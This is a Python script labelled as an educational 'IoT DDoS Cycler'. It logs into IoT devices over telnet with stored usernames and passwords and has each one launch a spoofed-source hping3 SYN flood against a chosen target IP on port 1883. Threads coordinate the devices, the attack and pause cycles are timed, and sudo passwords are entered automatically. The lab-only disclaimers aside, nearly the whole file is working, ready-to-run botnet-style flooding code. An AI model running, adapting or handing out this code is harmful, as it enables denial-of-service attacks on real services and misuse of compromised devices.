#!/usr/bin/env python3
"""
IoT DDoS Cycler Script
Configurable DDoS attack script with cycling patterns
Educational tool for controlled lab environments only
"""

import telnetlib
import threading
import time
import json
from datetime import datetime, timedelta
import argparse
import signal
import sys

class DDoSCycler:
    def __init__(self):
        self.attack_devices = []
        self.stop_attack = False
        self.attack_threads = []
        self.current_cycle = 0
        self.total_cycles = 6
        self.attack_duration = 240  # 4 minutes in seconds
        self.pause_duration = 120   # 2 minutes in seconds
        self.long_pause_duration = 300  # 5 minutes in seconds (after every 3 attacks)
        self.attacks_per_group = 3  # Number of attacks before long pause
        
    def add_device(self, ip, username, password):
        """Add a device to be used for DDoS attack"""
        device = {
            'ip': ip,
            'username': username,
            'password': password
        }
        self.attack_devices.append(device)
        print(f"[INFO] Added device: {ip} with credentials {username}:{password}")
        
    def load_devices_from_file(self, filename):
        """Load attack devices from JSON file"""
        try:
            with open(filename, 'r') as f:
                devices = json.load(f)
                for device in devices:
                    self.add_device(device['ip'], device['username'], device['password'])
            print(f"[INFO] Loaded {len(devices)} devices from {filename}")
        except FileNotFoundError:
            print(f"[ERROR] File {filename} not found")
        except json.JSONDecodeError:
            print(f"[ERROR] Invalid JSON format in {filename}")
        except Exception as e:
            print(f"[ERROR] Error loading devices: {e}")
    
    def save_devices_to_file(self, filename):
        """Save current device list to JSON file"""
        try:
            with open(filename, 'w') as f:
                json.dump(self.attack_devices, f, indent=2)
            print(f"[INFO] Saved {len(self.attack_devices)} devices to {filename}")
        except Exception as e:
            print(f"[ERROR] Error saving devices: {e}")
    
    def configure_devices_interactive(self):
        """Interactive configuration of attack devices"""
        print("\n[CONFIG] Interactive Device Configuration")
        print("=" * 50)
        
        while True:
            print(f"\nCurrent devices: {len(self.attack_devices)}")
            for i, device in enumerate(self.attack_devices, 1):
                print(f"  {i}. {device['ip']} ({device['username']}:{device['password']})")
            
            print("\nOptions:")
            print("1. Add new device")
            print("2. Remove device")
            print("3. Clear all devices")
            print("4. Load from file")
            print("5. Save to file")
            print("6. Continue with current devices")
            
            choice = input("\nEnter choice (1-6): ").strip()
            
            if choice == '1':
                ip = input("Enter device IP: ").strip()
                username = input("Enter username: ").strip()
                password = input("Enter password: ").strip()
                if ip and username and password:
                    self.add_device(ip, username, password)
                else:
                    print("[ERROR] All fields are required")
                    
            elif choice == '2':
                if not self.attack_devices:
                    print("[ERROR] No devices to remove")
                    continue
                try:
                    idx = int(input("Enter device number to remove: ")) - 1
                    if 0 <= idx < len(self.attack_devices):
                        removed = self.attack_devices.pop(idx)
                        print(f"[INFO] Removed device: {removed['ip']}")
                    else:
                        print("[ERROR] Invalid device number")
                except ValueError:
                    print("[ERROR] Please enter a valid number")
                    
            elif choice == '3':
                confirm = input("Clear all devices? (y/N): ").strip().lower()
                if confirm == 'y':
                    self.attack_devices = []
                    print("[INFO] All devices cleared")
                    
            elif choice == '4':
                filename = input("Enter filename to load from: ").strip()
                if filename:
                    self.load_devices_from_file(filename)
                    
            elif choice == '5':
                filename = input("Enter filename to save to: ").strip()
                if filename:
                    self.save_devices_to_file(filename)
                    
            elif choice == '6':
                if self.attack_devices:
                    break
                else:
                    print("[ERROR] No devices configured. Add at least one device.")
            else:
                print("[ERROR] Invalid choice")
    
    def configure_attack_parameters(self):
        """Configure attack timing and target"""
        print("\n[CONFIG] Attack Parameters")
        print("=" * 50)
        
        # Target IP
        while True:
            target_ip = input("Enter target IP address: ").strip()
            if target_ip:
                self.target_ip = target_ip
                break
            print("[ERROR] Target IP is required")
        
        # Cycle configuration
        print(f"\nCurrent configuration:")
        print(f"  Attack duration: {self.attack_duration // 60} minutes")
        print(f"  Regular pause duration: {self.pause_duration // 60} minutes")
        print(f"  Long pause duration: {self.long_pause_duration // 60} minutes")
        print(f"  Attacks per group: {self.attacks_per_group}")
        print(f"  Total cycles: {self.total_cycles}")
        
        # Calculate total time with new pattern
        cycles_per_group = self.attacks_per_group
        full_groups = self.total_cycles // cycles_per_group
        remaining_cycles = self.total_cycles % cycles_per_group
        time_per_group = (self.attack_duration + self.pause_duration) * cycles_per_group + self.long_pause_duration
        time_remaining = (self.attack_duration + self.pause_duration) * remaining_cycles
        if remaining_cycles > 0:
            time_remaining -= self.pause_duration  # No pause after the last cycle
        total_time = time_per_group * full_groups + time_remaining
        print(f"  Total time: {total_time // 60} minutes")
        print(f"  Pattern: {cycles_per_group} attacks of {self.attack_duration//60}min + {self.pause_duration//60}min pause, then {self.long_pause_duration//60}min long pause")
        
        modify = input("\nModify timing? (y/N): ").strip().lower()
        if modify == 'y':
            try:
                attack_min = int(input(f"Attack duration (minutes, current: {self.attack_duration // 60}): ") or str(self.attack_duration // 60))
                pause_min = int(input(f"Regular pause duration (minutes, current: {self.pause_duration // 60}): ") or str(self.pause_duration // 60))
                long_pause_min = int(input(f"Long pause duration (minutes, current: {self.long_pause_duration // 60}): ") or str(self.long_pause_duration // 60))
                attacks_per_group = int(input(f"Attacks per group (current: {self.attacks_per_group}): ") or str(self.attacks_per_group))
                cycles = int(input(f"Number of cycles (current: {self.total_cycles}): ") or str(self.total_cycles))
                
                self.attack_duration = attack_min * 60
                self.pause_duration = pause_min * 60
                self.long_pause_duration = long_pause_min * 60
                self.attacks_per_group = attacks_per_group
                self.total_cycles = cycles
                
                # Recalculate total time
                cycles_per_group = self.attacks_per_group
                full_groups = self.total_cycles // cycles_per_group
                remaining_cycles = self.total_cycles % cycles_per_group
                time_per_group = (self.attack_duration + self.pause_duration) * cycles_per_group + self.long_pause_duration
                time_remaining = (self.attack_duration + self.pause_duration) * remaining_cycles
                if remaining_cycles > 0:
                    time_remaining -= self.pause_duration
                total_time = time_per_group * full_groups + time_remaining
                print(f"[INFO] Updated configuration - Total time: {total_time // 60} minutes")
                
            except ValueError:
                print("[ERROR] Invalid input, using default values")
    
    def _single_device_ddos(self, device, target_ip, cycle_num):
        """Run DDoS attack from a single device"""
        ip = device['ip']
        username = device['username']
        password = device['password']
        
        try:
            print(f"[CYCLE {cycle_num}] [{ip}] Connecting to device...")
            tn = telnetlib.Telnet(ip, 23, timeout=10)
            
            # Login
            tn.read_until(b"login:", timeout=5)
            tn.write(username.encode('ascii') + b"\n")
            tn.read_until(b"Password:", timeout=5)
            tn.write(password.encode('ascii') + b"\n")
            
            # Wait for prompt
            response = tn.read_until(b"#", timeout=10)
            if b"#" not in response:
                tn.read_until(b"$", timeout=5)
            
            # Launch hping3 attack
            hping_cmd = f"sudo hping3 -S -p 1883 --interval u1000 --rand-source {target_ip}"
            print(f"[CYCLE {cycle_num}] [{ip}] Launching attack: {hping_cmd}")
            
            tn.write(hping_cmd.encode('ascii') + b"\n")
            
            # Handle sudo password if requested
            try:
                response = tn.read_until(b"password", timeout=3)
                if b"password" in response.lower():
                    print(f"[CYCLE {cycle_num}] [{ip}] Entering sudo password...")
                    tn.write(password.encode('ascii') + b"\n")
            except:
                pass  # No password prompt or timeout
            
            print(f"[CYCLE {cycle_num}] [{ip}] DDoS attack active against {target_ip}")
            
            # Keep attack running for the duration
            start_time = time.time()
            while not self.stop_attack and (time.time() - start_time) < self.attack_duration:
                try:
                    tn.read_very_eager()  # Clear buffer
                    time.sleep(1)
                except:
                    break
            
            # Stop attack
            print(f"[CYCLE {cycle_num}] [{ip}] Stopping attack...")
            try:
                tn.write(b"\x03")  # Send Ctrl+C
                time.sleep(2)
                tn.write(b"pkill hping3\n")  # Kill any remaining hping3 processes
                time.sleep(1)
            except:
                pass
                
            tn.close()
            print(f"[CYCLE {cycle_num}] [{ip}] Attack stopped")
            
        except Exception as e:
            print(f"[CYCLE {cycle_num}] [ERROR] Attack from {ip} failed: {e}")
    
    def run_ddos_cycle(self):
        """Run the complete DDoS cycling attack with custom timing pattern"""
        if not self.attack_devices:
            print("[ERROR] No attack devices configured")
            return
            
        if not hasattr(self, 'target_ip'):
            print("[ERROR] No target IP configured")
            return
        
        # Calculate total time with new pattern
        # Pattern: 3 attacks (4min + 2min each) + 5min long pause, repeated
        cycles_per_group = self.attacks_per_group
        full_groups = self.total_cycles // cycles_per_group
        remaining_cycles = self.total_cycles % cycles_per_group
        
        # Time calculation for the new pattern
        time_per_group = (self.attack_duration + self.pause_duration) * cycles_per_group + self.long_pause_duration
        time_remaining = (self.attack_duration + self.pause_duration) * remaining_cycles
        if remaining_cycles > 0:
            time_remaining -= self.pause_duration  # No pause after the last cycle
        total_time = time_per_group * full_groups + time_remaining
        
        print(f"\n[DDOS CYCLER] Starting cyclic DDoS attack")
        print(f"[INFO] Target: {self.target_ip}")
        print(f"[INFO] Attack devices: {len(self.attack_devices)}")
        print(f"[INFO] Pattern: {self.attack_duration//60}min attack, {self.pause_duration//60}min pause")
        print(f"[INFO] Long pause after every {self.attacks_per_group} attacks: {self.long_pause_duration//60}min")
        print(f"[INFO] Total cycles: {self.total_cycles}")
        print(f"[INFO] Total duration: {total_time//60} minutes")
        
        start_time = datetime.now()
        estimated_end = start_time + timedelta(seconds=total_time)
        print(f"[INFO] Start time: {start_time.strftime('%H:%M:%S')}")
        print(f"[INFO] Estimated end time: {estimated_end.strftime('%H:%M:%S')}")
        
        # Confirm start
        print("\n[WARNING] This will launch a coordinated DDoS attack!")
        confirm = input("Type 'START' to begin the cycling attack: ").strip()
        if confirm != 'START':
            print("[INFO] Attack cancelled")
            return
        
        try:
            for cycle in range(1, self.total_cycles + 1):
                if self.stop_attack:
                    break
                    
                self.current_cycle = cycle
                print(f"\n{'='*60}")
                print(f"CYCLE {cycle}/{self.total_cycles} - ATTACK PHASE")
                print(f"{'='*60}")
                
                # Start attack threads
                self.attack_threads = []
                for device in self.attack_devices:
                    thread = threading.Thread(
                        target=self._single_device_ddos,
                        args=(device, self.target_ip, cycle)
                    )
                    self.attack_threads.append(thread)
                    thread.start()
                
                # Monitor attack phase
                attack_start = time.time()
                while (time.time() - attack_start) < self.attack_duration and not self.stop_attack:
                    remaining = self.attack_duration - (time.time() - attack_start)
                    print(f"[CYCLE {cycle}] Attack phase - {remaining:.0f}s remaining")
                    time.sleep(10)  # Update every 10 seconds
                
                # Stop current attack
                self.stop_attack = True
                print(f"\n[CYCLE {cycle}] Stopping attack phase...")
                
                # Wait for threads to finish
                for thread in self.attack_threads:
                    thread.join(timeout=15)
                
                # Reset stop flag for next cycle
                self.stop_attack = False
                
                # Determine pause type and duration
                if cycle < self.total_cycles:  # Not the last cycle
                    # Check if this is the end of a 3-attack group
                    if cycle % self.attacks_per_group == 0:
                        # Long pause after every 3 attacks
                        pause_type = "LONG PAUSE"
                        current_pause_duration = self.long_pause_duration
                        print(f"\n{'='*60}")
                        print(f"CYCLE {cycle}/{self.total_cycles} - {pause_type} ({self.long_pause_duration//60} minutes)")
                        print(f"{'='*60}")
                    else:
                        # Regular pause
                        pause_type = "PAUSE"
                        current_pause_duration = self.pause_duration
                        print(f"\n{'='*60}")
                        print(f"CYCLE {cycle}/{self.total_cycles} - {pause_type} ({self.pause_duration//60} minutes)")
                        print(f"{'='*60}")
                    
                    # Execute pause
                    pause_start = time.time()
                    while (time.time() - pause_start) < current_pause_duration and not self.stop_attack:
                        remaining = current_pause_duration - (time.time() - pause_start)
                        print(f"[CYCLE {cycle}] {pause_type} phase - {remaining:.0f}s remaining")
                        time.sleep(10)  # Update every 10 seconds
        
        except KeyboardInterrupt:
            print("\n[STOP] Attack interrupted by user")
            self.stop_attack = True
            
            # Stop all running attacks
            for thread in self.attack_threads:
                thread.join(timeout=10)
        
        end_time = datetime.now()
        duration = end_time - start_time
        print(f"\n{'='*60}")
        print(f"DDOS CYCLING COMPLETED")
        print(f"{'='*60}")
        print(f"[INFO] End time: {end_time.strftime('%H:%M:%S')}")
        print(f"[INFO] Total duration: {duration}")
        print(f"[INFO] Cycles completed: {self.current_cycle}")
        print(f"[INFO] All attacks stopped")

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print('\n[STOP] Stopping all attacks...')
    global ddos_cycler
    if 'ddos_cycler' in globals():
        ddos_cycler.stop_attack = True
    sys.exit(0)

def main():
    global ddos_cycler
    
    # Set up signal handler for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)
    
    parser = argparse.ArgumentParser(description='IoT DDoS Cycler - Configurable cycling DDoS attacks')
    parser.add_argument('--target', help='Target IP address')
    parser.add_argument('--devices', help='JSON file containing attack devices')
    parser.add_argument('--attack-time', type=int, default=4, help='Attack duration in minutes (default: 4)')
    parser.add_argument('--pause-time', type=int, default=2, help='Regular pause duration in minutes (default: 2)')
    parser.add_argument('--long-pause', type=int, default=5, help='Long pause duration in minutes after every 3 attacks (default: 5)')
    parser.add_argument('--cycles', type=int, default=6, help='Number of cycles (default: 6)')
    parser.add_argument('--attacks-per-group', type=int, default=3, help='Number of attacks before long pause (default: 3)')
    parser.add_argument('--add-device', nargs=3, metavar=('IP', 'USERNAME', 'PASSWORD'), 
                       help='Add a single device (IP USERNAME PASSWORD)')
    
    args = parser.parse_args()
    
    ddos_cycler = DDoSCycler()
    
    # Configure timing from arguments
    ddos_cycler.attack_duration = args.attack_time * 60
    ddos_cycler.pause_duration = args.pause_time * 60
    ddos_cycler.long_pause_duration = args.long_pause * 60
    ddos_cycler.attacks_per_group = args.attacks_per_group
    ddos_cycler.total_cycles = args.cycles
    
    print("IoT DDoS Cycler - Educational Lab Tool")
    print("="*50)
    print("⚠️  WARNING: Use only in controlled lab environments!")
    print("⚠️  Never use against systems you don't own!")
    print("="*50)
    
    # Load devices from file if specified
    if args.devices:
        ddos_cycler.load_devices_from_file(args.devices)
    
    # Add single device if specified
    if args.add_device:
        ddos_cycler.add_device(args.add_device[0], args.add_device[1], args.add_device[2])
    
    # Set target if specified
    if args.target:
        ddos_cycler.target_ip = args.target
    
    # If no devices or target specified, use interactive mode
    if not ddos_cycler.attack_devices:
        ddos_cycler.configure_devices_interactive()
    
    if not hasattr(ddos_cycler, 'target_ip'):
        ddos_cycler.configure_attack_parameters()
    
    # Run the attack
    ddos_cycler.run_ddos_cycle()

if __name__ == "__main__":
    main()
